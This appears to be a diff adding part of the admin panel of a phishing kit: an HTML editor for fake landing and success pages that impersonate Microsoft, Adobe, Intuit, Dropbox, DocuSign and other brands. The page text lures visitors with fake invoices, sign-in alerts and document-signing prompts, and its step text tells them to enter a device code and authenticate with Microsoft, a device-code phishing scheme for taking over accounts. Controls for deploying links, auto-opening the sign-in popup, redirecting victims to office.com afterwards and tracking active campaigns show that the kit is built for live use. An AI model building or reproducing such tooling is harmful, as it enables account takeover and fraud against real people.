+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">DOCUMENT META</label>
+                                                <button type="button" id="lg-show-land-doc-meta" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-doc-meta')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-land-doc-meta" class="lg-input" value="Adobe Acrobat Document · Awaiting signature" oninput="onLandingFieldChange()">
+                                        </div>
+                                    </div>
+
+                                    <!-- Mode B: Bill/Invoice -->
+                                    <div id="mode-section-B" style="display:none; flex-direction:column; gap:10px;">
+                                        <div class="lg-subheading">RIGHT COLUMN — BILL & INVOICE</div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">INVOICE TITLE</label>
+                                                <button type="button" id="lg-show-land-b-title" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-b-title')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-land-b-title" class="lg-input" value="Verify your Identity" oninput="onLandingFieldChange()">
+                                        </div>
+                                        <div class="lg-row-2">
+                                            <div class="lg-form-group">
+                                                <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                    <label class="lg-label">AMOUNT</label>
+                                                    <button type="button" id="lg-show-land-b-amount" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-b-amount')">Show</button>
+                                                </div>
+                                                <input type="text" id="lg-land-b-amount" class="lg-input" value="$1,347.50" oninput="onLandingFieldChange()">
+                                            </div>
+                                            <div class="lg-form-group">
+                                                <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                    <label class="lg-label">INVOICE #</label>
+                                                    <button type="button" id="lg-show-land-b-invoice" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-b-invoice')">Show</button>
+                                                </div>
+                                                <input type="text" id="lg-land-b-invoice" class="lg-input" value="Invoice #2026-1047" oninput="onLandingFieldChange()">
+                                            </div>
+                                        </div>
+                                        <div class="lg-row-2">
+                                            <div class="lg-form-group">
+                                                <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                    <label class="lg-label">BILL FROM</label>
+                                                    <button type="button" id="lg-show-land-b-bill" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-b-bill')">Show</button>
+                                                </div>
+                                                <input type="text" id="lg-land-b-bill" class="lg-input" value="Intuit Inc." oninput="onLandingFieldChange()">
+                                            </div>
+                                            <div class="lg-form-group">
+                                                <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                    <label class="lg-label">STATUS / DATE</label>
+                                                    <button type="button" id="lg-show-land-b-date" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-b-date')">Show</button>
+                                                </div>
+                                                <input type="text" id="lg-land-b-date" class="lg-input" value="PAYMENT PENDING" oninput="onLandingFieldChange()">
+                                            </div>
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">DESCRIPTION</label>
+                                                <button type="button" id="lg-show-land-b-desc" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-b-desc')">Show</button>
+                                            </div>
+                                            <textarea id="lg-land-b-desc" class="lg-textarea" oninput="onLandingFieldChange()">To authorize this payment, verify your identity below.</textarea>
+                                        </div>
+                                    </div>
+
+                                    <!-- Mode A: Activity Alert -->
+                                    <div id="mode-section-A" style="display:none; flex-direction:column; gap:10px;">
+                                        <div class="lg-subheading" style="color:#ff6b72; font-weight:800;">ACTIVITY CARD</div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">EYEBROW</label>
+                                                <button type="button" id="lg-show-land-a-acct" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-a-acct')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-land-a-acct" class="lg-input" value="MICROSOFT ACCOUNT" oninput="onLandingFieldChange()">
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">TITLE</label>
+                                                <button type="button" id="lg-show-land-a-title" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-a-title')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-land-a-title" class="lg-input" value="Review this activity" oninput="onLandingFieldChange()">
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">DESCRIPTION</label>
+                                                <button type="button" id="lg-show-land-a-desc" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-a-desc')">Show</button>
+                                            </div>
+                                            <textarea id="lg-land-a-desc" class="lg-textarea" oninput="onLandingFieldChange()">Sign in to review recent account activity and secure your account.</textarea>
+                                        </div>
+                                        <div class="lg-row-2">
+                                            <div class="lg-form-group">
+                                                <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                    <label class="lg-label">IP LABEL</label>
+                                                    <button type="button" id="lg-show-land-a-ip-lbl" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-a-ip-lbl')">Show</button>
+                                                </div>
+                                                <input type="text" id="lg-land-a-ip-lbl" class="lg-input" value="IP ADDRESS" oninput="onLandingFieldChange()">
+                                            </div>
+                                            <div class="lg-form-group">
+                                                <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                    <label class="lg-label">IP VALUE (PREVIEW SAMPLE — LIVE USES VISITOR IP)</label>
+                                                    <button type="button" id="lg-show-land-a-ip" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-a-ip')">Show</button>
+                                                </div>
+                                                <input type="text" id="lg-land-a-ip" class="lg-input" value="185.234.xx.xx" oninput="onLandingFieldChange()">
+                                            </div>
+                                        </div>
+                                        <div class="lg-row-2">
+                                            <div class="lg-form-group">
+                                                <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                    <label class="lg-label">LOCATION LABEL</label>
+                                                    <button type="button" id="lg-show-land-a-loc-lbl" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-a-loc-lbl')">Show</button>
+                                                </div>
+                                                <input type="text" id="lg-land-a-loc-lbl" class="lg-input" value="LOCATION" oninput="onLandingFieldChange()">
+                                            </div>
+                                            <div class="lg-form-group">
+                                                <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                    <label class="lg-label">LOCATION VALUE (PREVIEW SAMPLE — LIVE USES VISITOR GEO)</label>
+                                                    <button type="button" id="lg-show-land-a-loc" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-a-loc')">Show</button>
+                                                </div>
+                                                <input type="text" id="lg-land-a-loc" class="lg-input" value="Frankfurt, Germany" oninput="onLandingFieldChange()">
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Mode R: Review & Sign Steps -->
+                                    <div id="mode-section-R" style="display:none; flex-direction:column; gap:10px;">
+                                        <div class="lg-subheading">RIGHT COLUMN — REVIEW & SIGN STEPS</div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">HEADER TITLE</label>
+                                                <button type="button" id="lg-show-land-r-title" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-r-title')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-land-r-title" class="lg-input" value="Document ready for review" oninput="onLandingFieldChange()">
+                                        </div>
+                                        <div style="display:flex;justify-content:space-between;align-items:center;margin-top:2px;">
+                                            <label class="lg-label">STEPS (1, 2, 3)</label>
+                                            <button type="button" id="lg-show-land-r-steps" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-r-steps'); onLandingFieldChange();">Show</button>
+                                        </div>
+                                        <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px;">
+                                            <div class="lg-form-group">
+                                                <label class="lg-label">STEP 1</label>
+                                                <input type="text" id="lg-land-r-step1" class="lg-input" value="Verify Identity" oninput="onLandingFieldChange()">
+                                            </div>
+                                            <div class="lg-form-group">
+                                                <label class="lg-label">STEP 2</label>
+                                                <input type="text" id="lg-land-r-step2" class="lg-input" value="Review" oninput="onLandingFieldChange()">
+                                            </div>
+                                            <div class="lg-form-group">
+                                                <label class="lg-label">STEP 3</label>
+                                                <input type="text" id="lg-land-r-step3" class="lg-input" value="Sign" oninput="onLandingFieldChange()">
+                                            </div>
+                                        </div>
+                                        <div class="lg-row-2">
+                                            <div class="lg-form-group">
+                                                <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                    <label class="lg-label">DOCUMENT NAME</label>
+                                                    <button type="button" id="lg-show-land-r-doc" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-r-doc')">Show</button>
+                                                </div>
+                                                <input type="text" id="lg-land-r-doc" class="lg-input" value="Non-Disclosure Agreement" oninput="onLandingFieldChange()">
+                                            </div>
+                                            <div class="lg-form-group">
+                                                <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                    <label class="lg-label">BADGE</label>
+                                                    <button type="button" id="lg-show-land-r-badge" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-r-badge')">Show</button>
+                                                </div>
+                                                <input type="text" id="lg-land-r-badge" class="lg-input" value="PDF" oninput="onLandingFieldChange()">
+                                            </div>
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">DOCUMENT META</label>
+                                                <button type="button" id="lg-show-land-r-meta" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-r-meta')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-land-r-meta" class="lg-input" value="NDA-2026-Final.pdf · 4 pages" oninput="onLandingFieldChange()">
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">DESCRIPTION</label>
+                                                <button type="button" id="lg-show-land-r-desc" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-r-desc')">Show</button>
+                                            </div>
+                                            <textarea id="lg-land-r-desc" class="lg-textarea" oninput="onLandingFieldChange()">To review and sign this document, complete the verification steps below.</textarea>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- SECTION 3: VERIFY & STEPS -->
+                                <div class="lg-editor-box">
+                                    <div class="lg-box-title"><span>VERIFY & STEPS</span></div>
+                                    <div class="lg-form-group">
+                                        <div style="display:flex;justify-content:space-between;align-items:center;">
+                                            <label class="lg-label">VERIFY HEADING</label>
+                                            <button type="button" id="lg-show-land-verify-head" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-verify-head')">Show</button>
+                                        </div>
+                                        <input type="text" id="lg-land-verify-head" class="lg-input" value="Verify your identity" oninput="onLandingFieldChange()">
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <div style="display:flex;justify-content:space-between;align-items:center;">
+                                            <label class="lg-label">VERIFY DESCRIPTION</label>
+                                            <button type="button" id="lg-show-land-verify-desc" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-verify-desc')">Show</button>
+                                        </div>
+                                        <textarea id="lg-land-verify-desc" class="lg-textarea" oninput="onLandingFieldChange()">To review this sign-in activity, complete the verification steps below.</textarea>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <div style="display:flex;justify-content:space-between;align-items:center;">
+                                            <label class="lg-label">STEPS HEADING</label>
+                                            <button type="button" id="lg-show-land-steps-head" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-steps-head')">Show</button>
+                                        </div>
+                                        <input type="text" id="lg-land-steps-head" class="lg-input" value="Steps to secure:" oninput="onLandingFieldChange()">
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <div style="display:flex;justify-content:space-between;align-items:center;">
+                                            <label class="lg-label">STEPS TEXT</label>
+                                            <button type="button" id="lg-show-land-steps-text" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-steps-text')">Show</button>
+                                        </div>
+                                        <textarea id="lg-land-steps-text" class="lg-textarea" style="min-height:92px; font-family:monospace; font-size:0.75rem;" oninput="onLandingFieldChange()">1. Click the button below to open the sign-in window.
+2. Enter the code {CODE} when prompted.
+3. Authenticate with your Microsoft account.
+4. Return to this tab to review the activity.</textarea>
+                                    </div>
+                                </div>
+
+                                <!-- SECTION 4: PAGE & CARD BACKGROUNDS -->
+                                <div class="lg-editor-box">
+                                    <div class="lg-box-title"><span>PAGE & CARD BACKGROUNDS</span></div>
+                                    <p class="lg-hint-text">Page background fills the right column only (never the left column). Content card background styles the bordered card itself. Verification code and Steps cards have their own backgrounds. Left page background color/image controls are in the left column editor.</p>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">PAGE BACKGROUND</label>
+                                        <div class="lg-row-inline">
+                                            <input type="color" id="lg-land-page-bg" class="lg-color-box" value="#f5f5f5" oninput="onLandingFieldChange()">
+                                            <button type="button" class="lg-default-btn" onclick="resetLandColor('lg-land-page-bg', '#f5f5f5')">USE DEFAULT</button>
+                                        </div>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">CONTENT CARD BACKGROUND</label>
+                                        <div class="lg-row-inline">
+                                            <input type="color" id="lg-land-card-bg" class="lg-color-box" value="#ffffff" oninput="onLandingFieldChange()">
+                                            <button type="button" class="lg-default-btn" onclick="resetLandColor('lg-land-card-bg', '#ffffff')">USE DEFAULT</button>
+                                        </div>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">VERIFICATION CODE CARD</label>
+                                        <div class="lg-row-inline">
+                                            <input type="color" id="lg-land-code-bg" class="lg-color-box" value="#ffffff" oninput="onLandingFieldChange()">
+                                            <button type="button" class="lg-default-btn" onclick="resetLandColor('lg-land-code-bg', '#ffffff')">USE DEFAULT</button>
+                                        </div>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">STEPS CARD BACKGROUND</label>
+                                        <div class="lg-row-inline">
+                                            <input type="color" id="lg-land-steps-bg" class="lg-color-box" value="#fbfbfb" oninput="onLandingFieldChange()">
+                                            <button type="button" class="lg-default-btn" onclick="resetLandColor('lg-land-steps-bg', '#fbfbfb')">USE DEFAULT</button>
+                                        </div>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                                            <label class="lg-label">PAGE BACKGROUND IMAGE (OPTIONAL)</label>
+                                            <button type="button" id="lg-land-bg-image-show" class="lg-toggle-show active" data-visible="1" onclick="toggleLandBgImageShow()">Show</button>
+                                        </div>
+                                        <div class="lg-row-inline" style="margin-bottom:6px;">
+                                            <label class="lg-file-btn"><input type="file" id="lg-land-page-bg-file" accept="image/*" style="display:none;" onchange="onLandingPageBgUpload(event)">Choose File</label>
+                                            <span id="lg-land-page-bg-txt" style="font-size:11px; color:#a49498;">Blueprint Floor Plan (Default)</span>
+                                            <button type="button" class="lg-default-btn" onclick="resetLandBgToBlueprint()">DEFAULT BLUEPRINT</button>
+                                        </div>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                                            <label class="lg-label">PAGE BACKGROUND BLUR</label>
+                                            <span id="lg-land-blur-num" style="color:#ff6b72; font-size:0.75rem; font-weight:700;">8%</span>
+                                        </div>
+                                        <input type="range" id="lg-land-blur" min="0" max="100" value="8" style="accent-color:#e50914; width:100%;" oninput="document.getElementById('lg-land-blur-num').innerText=this.value+'%'; updateIframeLiveBlur(this.value); onLandingFieldChange();">
+                                        <span class="lg-hint-text">0 = sharp · 100 = extremely blurred (image only)</span>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">CONTENT CARD BACKGROUND IMAGE (OPTIONAL)</label>
+                                        <input type="file" id="lg-land-card-bg-file" accept="image/*" class="lg-input" style="padding:6px; font-size:0.75rem;" onchange="onLandingCardBgUpload(event)">
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">VERIFICATION CODE CARD IMAGE (OPTIONAL)</label>
+                                        <input type="file" id="lg-land-code-bg-file" accept="image/*" class="lg-input" style="padding:6px; font-size:0.75rem;" onchange="onLandingCodeBgUpload(event)">
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">STEPS CARD BACKGROUND IMAGE (OPTIONAL)</label>
+                                        <input type="file" id="lg-land-steps-bg-file" accept="image/*" class="lg-input" style="padding:6px; font-size:0.75rem;" onchange="onLandingStepsBgUpload(event)">
+                                    </div>
+                                </div>
+
+                                <!-- SECTION 5: COPY & SIGN-IN BUTTONS -->
+                                <div class="lg-editor-box">
+                                    <div class="lg-box-title"><span>COPY & SIGN-IN BUTTONS</span></div>
+                                    <div style="display:flex; align-items:flex-start; gap:9px; margin-bottom:4px;">
+                                        <input type="checkbox" id="lg-land-auto-open" style="accent-color:#e50914; margin-top:2px;" onchange="onLandingFieldChange()">
+                                        <div>
+                                            <strong style="font-size:0.76rem; color:#f0ebed;">Auto-open Sign-in</strong>
+                                            <p class="lg-hint-text">After visitors copy the device code, automatically open the Microsoft sign-in popup. Off by default.</p>
+                                        </div>
+                                    </div>
+                                    <div class="lg-row-2">
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">COPY BUTTON LABEL</label>
+                                                <button type="button" id="lg-show-land-copy-label" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-copy-label')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-land-copy-label" class="lg-input" value="Copy code" oninput="onLandingFieldChange()">
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">SIGN-IN BUTTON LABEL</label>
+                                                <button type="button" id="lg-show-land-signin-label" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-signin-label')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-land-signin-label" class="lg-input" value="Sign in with Microsoft" oninput="onLandingFieldChange()">
+                                        </div>
+                                    </div>
+                                    <div class="lg-row-2">
+                                        <div class="lg-form-group">
+                                            <label class="lg-label">COPY BUTTON COLOR</label>
+                                            <div class="lg-row-inline">
+                                                <input type="color" id="lg-land-copy-color" class="lg-color-box" value="#FA0F00" oninput="onLandingFieldChange()">
+                                                <button type="button" class="lg-default-btn" onclick="resetLandColor('lg-land-copy-color', '#FA0F00')">USE TEMPLATE DEFAULT</button>
+                                            </div>
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <label class="lg-label">SIGN-IN BUTTON COLOR</label>
+                                            <div class="lg-row-inline">
+                                                <input type="color" id="lg-land-signin-color" class="lg-color-box" value="#000000" oninput="onLandingFieldChange()">
+                                                <button type="button" class="lg-default-btn" onclick="resetLandColor('lg-land-signin-color', '#000000')">USE TEMPLATE DEFAULT</button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- SECTION 6: FOOTER -->
+                                <div class="lg-editor-box">
+                                    <div class="lg-box-title"><span>FOOTER</span></div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">CUSTOM FOOTER (PLAIN TEXT)</label>
+                                        <textarea id="lg-land-custom-footer" class="lg-textarea" placeholder="Shown below the sign-in button..." oninput="onLandingFieldChange()"></textarea>
+                                    </div>
+                                </div>
+
+                                <button type="button" class="lg-reset-link" onclick="resetLandingCustomizations()">RESET ALL CUSTOMIZATIONS</button>
+                            </div>
+                        </div>
+
+                        <!-- SUCCESS EDITOR (Accordion) -->
+                        <div class="lg-accordion" id="lg-success-section">
+                            <div class="lg-acc-header" onclick="toggleAccordion('lg-success-body')">
+                                <div class="lg-acc-title">SUCCESS ✎ EDITOR</div>
+                                <span style="font-size:12px; color:#a49498;">▼</span>
+                            </div>
+                            <div id="lg-success-body" class="lg-acc-body collapsed">
+                                <div class="lg-form-group" style="margin-bottom:6px;">
+                                    <select id="lg-success-template" class="lg-select" onchange="onSuccessTemplateChange()">
+                                        <option value="Dropbox" selected>Dropbox</option>
+                                        <option value="Microsoft Teams">Microsoft Teams</option>
+                                        <option value="Cloud Voicemail">Cloud Voicemail</option>
+                                        <option value="Adobe">Adobe</option>
+                                        <option value="DocuSign">DocuSign</option>
+                                        <option value="OneDrive">OneDrive</option>
+                                        <option value="QuickBooks">QuickBooks</option>
+                                        <option value="Outlook">Outlook</option>
+                                        <option value="SharePoint">SharePoint</option>
+                                        <option value="Microsoft 365">Microsoft 365</option>
+                                    </select>
+                                </div>
+
+                                <!-- SECTION 1: BRANDING & HEADER -->
+                                <div class="lg-editor-box">
+                                    <div class="lg-box-title"><span>BRANDING & HEADER</span></div>
+                                    <div class="lg-row-2">
+                                        <div class="lg-form-group">
+                                            <label class="lg-label">CUSTOM LOGO</label>
+                                            <input type="file" id="lg-succ-logo-file" accept="image/*" class="lg-input" style="padding:6px; font-size:0.75rem;" onchange="onSuccessLogoUpload(event)">
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <label class="lg-label">HEADER BANNER IMAGE (TOP OF CARD, OPTIONAL)</label>
+                                            <input type="file" id="lg-succ-banner-file" accept="image/*" class="lg-input" style="padding:6px; font-size:0.75rem;" onchange="onSuccessBannerUpload(event)">
+                                        </div>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">HEADER AREA COLOR (LOGO + TITLE BAND)</label>
+                                        <div class="lg-row-inline">
+                                            <input type="color" id="lg-succ-header-color" class="lg-color-box" value="#ffffff" oninput="onSuccessFieldChange()">
+                                            <button type="button" class="lg-default-btn" onclick="resetSuccColor('lg-succ-header-color', '#ffffff')">USE TEMPLATE DEFAULT</button>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- SECTION 2: SERVICE NAME -->
+                                <div class="lg-editor-box">
+                                    <div class="lg-box-title"><span>SERVICE NAME</span></div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">PAGE TITLE (BROWSER TAB)</label>
+                                        <input type="text" id="lg-succ-page-title" class="lg-input" placeholder="Optional — defaults to template title" oninput="onSuccessFieldChange()">
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">CONTENT CARD TITLE</label>
+                                        <input type="text" id="lg-succ-card-title" class="lg-input" value="Shared folder access" oninput="onSuccessFieldChange()">
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">SERVICE NAME (OPTIONAL)</label>
+                                        <input type="text" id="lg-succ-service-name" class="lg-input" value="Dropbox" oninput="onSuccessFieldChange()">
+                                    </div>
+                                </div>
+
+                                <!-- SECTION 3: PAGE & CARD BACKGROUNDS -->
+                                <div class="lg-editor-box">
+                                    <div class="lg-box-title"><span>PAGE & CARD BACKGROUNDS</span></div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">PAGE BACKGROUND</label>
+                                        <div class="lg-row-inline">
+                                            <input type="color" id="lg-succ-page-bg" class="lg-color-box" value="#ffffff" oninput="onSuccessFieldChange()">
+                                            <button type="button" class="lg-default-btn" onclick="resetSuccColor('lg-succ-page-bg', '#ffffff')">USE TEMPLATE DEFAULT</button>
+                                        </div>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">CONTENT CARD BACKGROUND</label>
+                                        <div class="lg-row-inline">
+                                            <input type="color" id="lg-succ-card-bg" class="lg-color-box" value="#ffffff" oninput="onSuccessFieldChange()">
+                                            <button type="button" class="lg-default-btn" onclick="resetSuccColor('lg-succ-card-bg', '#ffffff')">USE TEMPLATE DEFAULT</button>
+                                        </div>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                                            <label class="lg-label">PAGE BACKGROUND IMAGE</label>
+                                            <button type="button" id="lg-succ-bg-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-succ-bg-show'); onSuccessFieldChange();">Show</button>
+                                        </div>
+                                        <div class="lg-row-inline">
+                                            <label class="lg-file-btn"><input type="file" id="lg-succ-page-bg-file" accept="image/*" style="display:none;" onchange="onSuccessPageBgUpload(event)">Choose File</label>
+                                            <span class="lg-file-name" id="lg-succ-bg-name">Blueprint Floor Plan (Default)</span>
+                                            <button type="button" class="lg-default-btn" onclick="useDefaultSuccessBg()">DEFAULT BLUEPRINT</button>
+                                        </div>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                                            <label class="lg-label">PAGE BACKGROUND BLUR</label>
+                                            <span id="lg-succ-blur-num" style="color:#ff6b72; font-size:0.75rem; font-weight:700;">8%</span>
+                                        </div>
+                                        <input type="range" id="lg-succ-blur" min="0" max="100" value="8" style="accent-color:#e50914; width:100%;" oninput="document.getElementById('lg-succ-blur-num').innerText=this.value+'%'; updateIframeLiveBlur(this.value); onSuccessFieldChange();">
+                                        <span class="lg-hint-text">0 = sharp · 100 = extremely blurred (image only)</span>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">CONTENT CARD BACKGROUND IMAGE (OPTIONAL)</label>
+                                        <input type="file" id="lg-succ-card-bg-file" accept="image/*" class="lg-input" style="padding:6px; font-size:0.75rem;" onchange="onSuccessCardBgUpload(event)">
+                                    </div>
+                                </div>
+
+                                <!-- SECTION 4: LABELS & BODY TEXT -->
+                                <div class="lg-editor-box">
+                                    <div class="lg-box-title"><span>LABELS & BODY TEXT</span></div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">BODY CARD BACKGROUND</label>
+                                        <div class="lg-row-inline">
+                                            <input type="color" id="lg-succ-body-card-bg" class="lg-color-box" value="#fdfbf7" oninput="onSuccessFieldChange()">
+                                            <button type="button" class="lg-default-btn" onclick="resetSuccColor('lg-succ-body-card-bg', '#fdfbf7')">USE TEMPLATE DEFAULT</button>
+                                        </div>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">SUCCESS BODY (PLAIN TEXT)</label>
+                                        <textarea id="lg-succ-body-text" class="lg-textarea" oninput="onSuccessFieldChange()">Thanks for verifying your identity. You will be redirected to Microsoft 365 shortly.</textarea>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">SUCCESS FOOTER (PLAIN TEXT)</label>
+                                        <textarea id="lg-succ-footer-text" class="lg-textarea" placeholder="Shown above the redirect line..." oninput="onSuccessFieldChange()"></textarea>
+                                    </div>
+                                </div>
+
+                                <!-- SECTION 5: REDIRECT -->
+                                <div class="lg-editor-box">
+                                    <div class="lg-box-title"><span>REDIRECT</span></div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">REDIRECT SECONDS (OFFICE.COM)</label>
+                                        <input type="number" id="lg-succ-redirect-sec" class="lg-input" value="5" min="1" max="60" oninput="onSuccessFieldChange()" style="max-width:120px;">
+                                    </div>
+                                </div>
+
+                                <button type="button" class="lg-reset-link" onclick="resetSuccessCustomizations()">RESET ALL CUSTOMIZATIONS</button>
+                            </div>
+                        </div>
+
+                        <!-- LANDING URL -->
+                        <div class="lg-form-group">
+                            <label class="lg-label">LANDING URL</label>
+                            <input type="text" id="lg-landing-url" class="lg-input" value="https://www.office.com/" oninput="onFieldChange()">
+                            <span style="font-size:10px; color:#a49498;">After verification, the live success page redirects here. Default is office.com.</span>
+                        </div>
+
+                        <!-- TRANSLATION LANGUAGES & DEPLOY -->
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-top:8px;">
+                            <button type="button" class="lg-default-btn" style="background:#261115; border-color:#5a1c22; color:#f0ebed; padding:8px 14px;">
+                                🌐 LANGUAGE (1)
+                            </button>
+                            <button type="button" class="lg-deploy-btn" onclick="deployLink()">
+                                🚀 Deploy
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Right: Live Preview Box -->
+                    <div class="lg-preview-card">
+                        <div class="lg-preview-header">
+                            <div class="lg-preview-title" id="lg-preview-tab-label">
+                                <span>👁️</span> PRE-LAND PREVIEW
+                            </div>
+                            <div class="lg-preview-tabs">
+                                <button type="button" class="lg-preview-tab-btn active" id="btn-prev-preland" onclick="setPreviewTab('preland')">PRE-LAND</button>
+                                <button type="button" class="lg-preview-tab-btn" id="btn-prev-landing" onclick="setPreviewTab('landing')">LANDING</button>
+                                <button type="button" class="lg-preview-tab-btn" id="btn-prev-success" onclick="setPreviewTab('success')">SUCCESS</button>
+                            </div>
+                        </div>
+
+                        <div class="lg-preview-viewport">
+                            <iframe id="lg-preview-iframe" class="lg-preview-iframe"></iframe>
+                        </div>
+
+                        <div class="lg-preview-footer-url" id="lg-preview-url-text">
+                            http://127.0.0.1:5000/verify
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bottom Section: Active Deployments Table -->
+                <div class="lg-deployments-box">
+                    <div class="lg-deploy-header-row">
+                        <div class="lg-section-title" style="margin-bottom:0;">
+                            <span>📋</span> Active deployments
+                        </div>
+                        <div>
+                            <button type="button" class="lg-icon-btn" title="Export Links" onclick="copyAllLinks()">🔗</button>
+                            <button type="button" class="lg-icon-btn" title="Delete Selected" style="color:#ff3b45; border-color:#e50914;" onclick="deleteSelectedDeployments()">🗑️</button>
+                            <button type="button" class="lg-icon-btn" title="B2B Campaign" onclick="showPage('b2b')">✉️</button>
+                        </div>
+                    </div>
+
+                    <div style="overflow-x:auto;">
+                        <table class="lg-table">
+                            <thead>
+                                <tr>
+                                    <th style="width:30px;"><input type="checkbox" id="lg-check-all" onchange="toggleAllDeployChecks(this)"></th>
+                                    <th>DEPLOYED LINK</th>
+                                    <th>CAMPAIGN NAME</th>
+                                    <th>PRE-LANDING</th>
+                                    <th>LANDING</th>
+                                    <th>SUCCESS</th>
+                                    <th>STATUS</th>
+                                    <th>CREATED</th>
